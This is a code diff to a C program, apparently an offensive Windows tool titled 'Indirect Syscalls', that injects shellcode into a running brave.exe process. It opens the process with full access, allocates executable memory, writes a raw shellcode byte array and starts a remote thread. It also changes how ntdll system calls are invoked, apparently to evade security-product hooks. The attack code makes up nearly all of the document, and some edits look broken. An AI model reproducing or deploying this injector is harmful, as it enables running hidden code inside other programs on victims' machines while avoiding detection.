@@ -2,9 +2,9 @@
 #include <Windows.h>
 #include <winternl.h>
 #include <tlhelp32.h>
-#include "injector.h"
+#include "injection.h"
 
-int banner() {
+void* banner() {
 
 	printf("\n  Indirect Syscalls                     \n");
 	printf("  Author: somby0x55                       \n\n");
@@ -21,22 +21,11 @@ int banner() {
 	printf("         |   |     ____-(     )_          \n");
 	printf("    __-nm'--mm----/      `--____)         \n");
 	printf("  //                                      \n\n\n");
-	return 0;
+	return;
 }
 
 int injector() {
 
-	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-
-	GetSSN(hNtdll, "NtOpenProcess", &NtOpenProcessSSN);
-	GetSSN(hNtdll, "NtAllocateVirtualMemory", &NtAllocateVirtualMemorySSN);
-	GetSSN(hNtdll, "NtWriteVirtualMemory", &NtWriteVirtualMemorySSN);
-	GetSSN(hNtdll, "NtCreateThreadEx", &NtCreateThreadExSSN);
-
-	printf("(+) Found SSN for \"NtOpenProcess\": 0x%x", NtOpenProcessSSN);
-	printf("\n(+) Found SSN for \"NtAllocateVirtualMemory\": 0x%x", NtAllocateVirtualMemorySSN);
-	printf("\n(+) Found SSN for \"NtWriteVirtualMemory\": 0x%x", NtWriteVirtualMemorySSN);
-	printf("\n(+) Found SSN for \"NtCreateThreadEx\": 0x%x", NtCreateThreadExSSN);
 
 
 	int targetpid = 0;
@@ -47,10 +36,12 @@ int injector() {
 	OBJECT_ATTRIBUTES objectAttributes;
 	InitializeObjectAttributes(&objectAttributes, NULL, OBJ_INHERIT, NULL, NULL);
 	CLIENT_ID clientID;
-	void* writtenSize = NULL;
+	SIZE_T writtenSize = NULL;
 	void* allocatedAddress = 0;
 
-	wchar_t targetExe[1][20] = { L"Notepad.exe" };
+	wchar_t targetExe[1][20] = { L"brave.exe" };
+
+	//message box payload
 	unsigned char shell[] =
 		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
 		"\x51\x41\x50\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60"
@@ -107,45 +98,54 @@ int injector() {
 	CloseHandle(hProcessSnap);
 
 
+	
 	if (targetpid != 0) {
 
 		clientID.UniqueProcess = (HANDLE)targetpid;
 		clientID.UniqueThread = NULL;
 
-		//
-		NTSTATUS openStatus = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objectAttributes, clientID);
+		patchFunc("ntdll.dll", "NtOpenProcess");
+		NTSTATUS openStatus = patchedFunction(&hProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientID);
 		if (openStatus != 0) {
-			printf("\n\n(!) Error opening process - 0x%x", openStatus);
+			printf("\n\n(!) Error opening process - 0x%x\n", openStatus);
+			return 1;
 		} else {
-			printf("\n\n(+) Process opened successfully");
+			printf("\n(+) Process opened successfully. Checking errors :%lu\n", GetLastError());
 		}
-
-		NTSTATUS allocateStatus = NtAllocateVirtualMemory(hProcess, &allocatedAddress, 0, &allocatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+		
+		patchFunc("ntdll.dll", "NtAllocateVirtualMemory");
+		FARPROC open = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
+		NTSTATUS allocateStatus = patchedFunction(hProcess, &allocatedAddress, 0, &allocatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 		if (allocateStatus != 0) {
-			printf("\n(!) Error allocating memory - 0x%x", allocateStatus);
+			printf("\n\n(!) Error allocating memory - 0x%x\n", allocateStatus);
+			return 1;
 		} else {
-			printf("\n(+) Memory allocated successfully");
+			printf("\n(+) Memory allocated successfully. Checking errors :%lu\n", GetLastError());
 		}
-
-		NTSTATUS writeStatus = NtWriteVirtualMemory(hProcess, allocatedAddress, &shell, sizeof(shell), &writtenSize);
+		
+		patchFunc("ntdll.dll", "NtWriteVirtualMemory");
+		FARPROC write = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
+		NTSTATUS writeStatus = patchedFunction(hProcess, allocatedAddress, &shell, sizeof(shell), &writtenSize);
 		if (writeStatus != 0) {
-			printf("\n(!) Error writing memory - 0x%x", writeStatus);
+			printf("\n\n(!) Error writing memory - 0x%x\n", writeStatus);
+			return 1;
 		} else {
-			printf("\n(+) Memory written successfully");
+			printf("\n(+) Memory written successfully. Checking errors :%lu\n", GetLastError());
 		}
-
-		NTSTATUS createStatus = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, CustomLoadLibraryW, allocatedAddress, NULL, 0, 0, 0, NULL);
+		
+		patchFunc("ntdll.dll", "NtCreateThreadEx");
+		NTSTATUS createStatus = patchedFunction(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)allocatedAddress, NULL, NULL, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
 		if (createStatus != 0) {
-			printf("\n(!) Error creating thread - 0x%x", createStatus);
+			printf("\n\n(!) Error creating thread - 0x%x\n", createStatus);
+			return 1;
 		} else {
-			printf("\n(+) Thread created successfully\n");
+			printf("\n(+) Thread created successfully. Checking errors :%lu\n", GetLastError());
 		}
-   
 	}
 
 	else {
 		printf("\n\n(!) Error pid was 0 - %lu\n", GetLastError());
 	}
-
+	
 	return 0;
 }
